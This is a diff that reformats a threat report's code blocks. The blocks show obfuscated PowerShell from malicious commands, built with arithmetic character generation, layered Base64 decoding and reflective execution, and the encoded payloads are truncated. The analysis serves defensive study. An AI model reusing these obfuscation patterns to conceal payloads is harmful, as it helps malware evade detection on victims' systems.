@@ -26,11 +26,18 @@ Two related commands were identified containing heavily obfuscated PowerShell. A
 The scripts used several layers of obfuscation, including arithmetic-based string generation, encoded payloads, compressed data blobs, and indirect execution with reflection. Snippets of these scripts are shown below.
 
 <pre><code>
-$xtrvndwblhkco=$executioncontext;$atedatatedesantionisaraloralenes = (-joIn (@((-838+(6369-(3626436/(-2638+3300)))),(349908/6729),(7048-6991),(10121-(900+(2956+6215))),(-4013+(2422+(-6051+(9845-2147)))),(532+((5201+(786+3650))-(2137+2278))),(2922+(2573-(1475+1339))),(-5864+((9875+8932)-(4329+8423))),(-1996+((4710+(-784+2648))-(6350-3682))),(-5618+((7544+(7047-2510))-(2138+1659))),((1639+(3292+8043))-(5087+8771)),(4375/(2912+3064)),(9883-(2881+6900)),(3576+(-652+3974))),(112 + (8322 - 5406)),(-4209+(1092+(-3370+6338))),((8259-5850)+(6575-1883)),(-8787+(3680+(-4525+6980))),(-3309+(1217+(-4904+2088))),((7980-5129)+(4630-3491)),(4293-(6694-6160)),((3389+3554)-(2790+7140)),(-8537+(8097+(-4310+6205))),((9022-3662)+(1688+4492)),(9061-7743),(5141-(2875+5030)),(7180-(4720+6598)),(5854-(6469+8301)),(8639-(4619+2102)),(-4411+((7317+2646)-(2482+7661))),((7000-6321)+(1202+7579)),(4195-(4195+4859)),((5290+6256)-(3590+4238)),(7482-2631)),[byte[]]::ConvertFromBase64String((($vwds = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("..."))) )))
+$xtrvndwblhkco=$executioncontext;$atedatatedesantionisaraloralenes = (-joIn (@((-838+(6369-(3626436/(-2638+3300)))),(349908/6729),(7048-6991),(10121-(900+(2956+6215))),(-4013+(2422+(-6051+(9845-2147)))),(532+((5201+(786+3650))-(2137+2278)))
+ (2922+(2573-(1475+1339))),(-5864+((9875+8932)-(4329+8423))),(-1996+((4710+(-784+2648))-(6350-3682))),(-5618+((7544+(7047-2510))-(2138+1659))),((1639+(3292+8043))-(5087+8771)),(4375/(2912+3064)),(9883-(2881+6900)),(3576+(-652+3974))),(112 + 
+(8322 - 5406))(-4209+(1092+(-3370+6338))),((8259-5850)+(6575-1883)),(-8787+(3680+(-4525+6980))),(-3309+(1217+(-4904+2088)))((7980-5129)+(4630-3491)),(4293-(6694-6160)),((3389+3554)-(2790+7140)),(-8537+(8097+(-4310+6205))),((9022-3662)+(1688+4492)),
+(9061-7743),(5141-(2875+5030)),(7180-(4720+6598)),(5854-(6469+8301)),(8639-(4619+2102)),(-4411+((7317+2646)-(2482+7661))),((7000-6321)+(1202+7579)),(4195-(4195+4859)),((5290+6256)-(3590+4238)),(7482-2631)),
+[byte[]]::ConvertFromBase64String((($vwds = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("..."))) )))
 </code></pre>
 
 <pre><code>
-[System.Text.Encoding]::ascii.(([char[]]@((4326-(25704455/(977+(6670-1606)) -join ''))((h8ndqpv76xz1jykoi20bgu3wt9e "Leo+cWlwdGpzZZqua+5qlhj220k3mpZUAhd5/2a/w0Vl7TOF0T3zd4v7VFrzBX84JejSIapRMQCOik7rmLLS4XszXeRT7fSs27LpI5xeIb/oG8WczxrdsIq7z434WoxPxJONCjavyZaBpJziRQ9rzdPIg4iNtNLmSfZ53kYuKRUJjsLowcZhLjROzBKPqNTeJRa4jh8ByZSM1ghpDBjAk5OSnsWgguAarP7rT5eslwRomsHJx5Ld+k7HixAKkN/csU4IioWZsd2wGg4rSWxbTI9GlvgMb1BSjV6YVL/J4L7RmyVyqCqq1JrnTQ2YGAzzriJr/sy3xHSkLctb0tpHx9mmbIDum87Ig9bviMTkEkZUCYLDVr4YFMe3bLB/DvkMyxrQJf+TuCGWvM17+NSbWPza69zrnF6eAfToqn8zrjXhPcP3LdLQ1P8sgKfrYjjsQHjsMaIc87+GK0pTjMtLi3LkvXQdATicdT4Flh2flZOiuonNcCblmwnt2f7J69YaqFDyBKVhgR/6GKoQWuQPvata0iTe0//eQAgaA+WdLPkBO+0DQOpAQYK8VUbLUe8P3llw/JebCT7pyphv2wT/VD5PulM1O1Au78+TAzfBkasoo1/p9Vd8oNsalDDBt5Uqbmj9wI2+ui2uPyi2VXzg3kdvSVeL("...")
+[System.Text.Encoding]::ascii.(([char[]]@((4326-(25704455/(977+(6670-1606)) -join ''))((h8ndqpv76xz1jykoi20bgu3wt9e "Leo+cWlwdGpzZZqua+5qlhj220k3mpZUAhd5/2a/
+w0Vl7TOF0T3zd4v7VFrzBX84JejSIapRMQCOik7rmLLS4XszXeRT7fSs27LpI5xeIb/oG8WczxrdsIq7z434WoxPxJONCjavyZaBpJziRQ9rzdPIg4iNtNLmSfZ53kYuKRUJjsLowcZhLjROzBKPqNTeJRa4jh8ByZSM1ghpDBjAk5OSnsWgguAarP7rT5eslwRomsHJx5Ld+k7HixAKkN
+/csU4IioWZsd2wGg4rSWxbTI9GlvgMb1BSjV6YVL/J4L7RmyVyqCqq1JrnTQ2YGAzzriJr/sy3xHSkLctb0tpHx9mmbIDum87Ig9bviMTkEkZUCYLDVr4YFMe3bLB/DvkMyxrQJf+TuCGWvM17+NSbWPza69zrnF6eAfToqn8zrjXhPcP3LdLQ1P8sgKfrYjjsQHjsMaIc87+GK0pTjMtLi
+3LkvXQdATicdT4Flh2flZOiuonNcCblmwnt2f7J69YaqFDyBKVhgR/6GKoQWuQPvata0iTe0//eQAgaA+WdLPkBO+0DQOpAQYK8VUbLUe8P3llw/JebCT7pyphv2wT/VD5PulM1O1Au78+TAzfBkasoo1/p9Vd8oNsalDDBt5Uqbmj9wI2+ui2uPyi2VXzg3kdvSVeL("...")
 </code></pre>
 
 ### Deobfuscation Results
